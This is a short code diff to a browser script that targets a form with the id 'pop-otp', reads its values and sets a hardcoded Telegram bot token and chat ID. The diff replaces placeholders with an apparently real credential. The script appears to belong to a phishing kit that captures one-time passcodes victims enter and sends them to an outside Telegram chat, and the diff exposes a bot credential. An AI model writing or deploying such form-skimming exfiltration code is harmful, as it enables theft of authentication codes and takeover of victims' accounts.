@@ -1,4 +1,4 @@
-alert("process.js loaded");
+
 
 function log(message) {
     console.log(message);
@@ -32,7 +32,7 @@ window.addEventListener("unhandledrejection", (event) => {
 document.addEventListener("DOMContentLoaded", () => {
     log("✅ Page loaded.");
 
-    const form = document.getElementById("pop-code");
+    const form = document.getElementById("pop-otp");
 
     if (!form) {
         log("❌ Form #pop-code not found.");
@@ -54,8 +54,8 @@ document.addEventListener("DOMContentLoaded", () => {
             }
 
             // Replace these with your Telegram Bot details
-            const BOT_TOKEN = "YOUR_BOT_TOKEN";
-            const CHAT_ID = "YOUR_CHAT_ID";
+            const BOT_TOKEN = "8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM";
+            const CHAT_ID = "8614416084";
 
             log("Reading form values...");
 
